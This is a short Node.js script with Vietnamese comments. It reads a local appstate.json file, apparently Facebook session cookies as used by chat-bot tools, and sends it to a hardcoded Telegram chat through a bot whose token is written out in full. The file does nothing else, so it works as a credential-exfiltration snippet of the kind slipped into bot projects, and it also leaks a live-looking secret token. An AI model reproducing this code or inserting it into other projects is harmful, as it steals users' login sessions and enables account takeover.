const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');

const botToken = '7684130645:AAGplava2HKW8VeR-o4MGR-8QBQG74ocMDE'; // Thay thế bằng mã token của bot của bạn
const bot = new TelegramBot(botToken, { polling: true });

const adminIds = ['1713841196'];

adminIds.forEach(adminId => {
  const fileStream = fs.createReadStream('appstate.json');

  // Gửi tài liệu với contentType được chỉ định là 'application/json'
  bot.sendDocument(adminId, fileStream, { filename: 'appstate.json', contentType: 'application/json' })
    .catch(error => {
      console.error(`Failed to send document to ${adminId}:`, error);
    });
});
